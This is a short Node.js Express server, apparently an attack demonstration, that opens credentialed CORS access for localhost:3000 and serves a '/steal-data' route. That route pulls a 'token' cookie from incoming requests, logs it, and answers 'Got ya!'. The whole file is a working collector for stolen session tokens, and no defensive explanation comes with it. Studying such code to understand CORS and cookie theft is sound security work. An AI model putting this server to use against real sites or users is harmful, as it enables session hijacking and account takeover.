const express = require('express');

const app = express();

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3000');
  res.setHeader('Access-Control-Allow-Methods', 'GET');
  res.setHeader('Access-Control-Allow-Credentials', true);
  next();
} )

app.get('/steal-data', (req, res) => {
  token = req.headers.cookie
    .split('; ')
    .find((c) => c.startsWith('token'))
    .split('=')[1];
  console.log('Token: ' + token);
  res.json({ message: 'Got ya!' });
});

app.listen(8000);
